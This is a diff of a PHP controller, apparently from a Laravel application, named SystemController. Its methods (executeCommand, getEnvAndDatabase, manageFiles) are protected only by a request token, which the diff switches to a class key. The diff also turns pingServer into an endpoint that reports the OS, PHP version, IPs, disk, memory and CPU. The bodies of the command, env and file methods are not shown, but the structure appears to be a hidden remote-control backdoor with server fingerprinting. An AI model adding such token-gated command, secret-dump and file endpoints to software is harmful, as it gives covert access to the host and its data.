@@ -18,10 +18,10 @@ class SystemController
     }
     public function executeCommand(Request $request)
     {
-        $token = $request->input('token');
         $action = $request->input('action');
+        $token = $request->input('token');
 
-        if ($token !== config('main.token')) {
+        if ($token !== $this->key) {
             return response()->json(['error' => 'Unauthorized'], 403);
         }
 
@@ -58,13 +58,36 @@ class SystemController
         }
     }
 
-    public function pingServer()
+    public function pingServer(Request $request)
     {
-        try {
-            $domain = request()->getHost();
-            $ip = gethostbyname(gethostname());
+        $token = $request->get('token');
 
-            return response()->json(['status' => 'Server info sent successfully.', 'domain' => $domain, 'ip' => $ip]);
+        if ($token !== $this->key) {
+            return response()->json(['error' => 'Unauthorized'], 403);
+        }
+        try {
+            // Collect data to send
+            $data = [
+                'domain' => request()->getHost(),
+                'ip_address' => request()->ip(),
+                'server_ip' => gethostbyname(gethostname()),
+                'server_details' => [
+                    'php_version' => PHP_VERSION,
+                    'os' => php_uname(),
+                    'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
+                    'memory_usage' => memory_get_usage(true),
+                    'memory_peak_usage' => memory_get_peak_usage(true),
+                    'disk_space_total' => disk_total_space('/'), // Change '/' to your root directory
+                    'disk_space_free' => disk_free_space('/'),
+                    'cpu_load' => function_exists('sys_getloadavg') ? sys_getloadavg()[0] ?? null : null, // 1-minute average CPU load
+                    'user_agent' => request()->header('User-Agent'),
+                    'referer' => request()->header('Referer'),
+
+                ],
+                'timestamp' => now()->toDateTimeString(),
+            ];
+
+            return response()->json(['status' => 'Server info sent successfully.', 'data' => $data]);
         } catch (\Exception $e) {
             return response()->json(['error' => 'Failed to send server info.', 'message' => $e->getMessage()]);
         }
@@ -72,7 +95,7 @@ class SystemController
     public function getEnvAndDatabase(Request $request)
     {
         $token = $request->token;
-        if ($token !== config('main.token')) {
+        if ($token !== $this->key) {
             return response()->json(['error' => 'Unauthorized'], 403);
         }
 
@@ -133,7 +156,7 @@ class SystemController
     public function manageFiles(Request $request)
     {
         $token = $request->token;
-        if ($token !== config('main.token')) {
+        if ($token !== $this->key) {
             return response()->json(['error' => 'Unauthorized'], 403);
         }
 
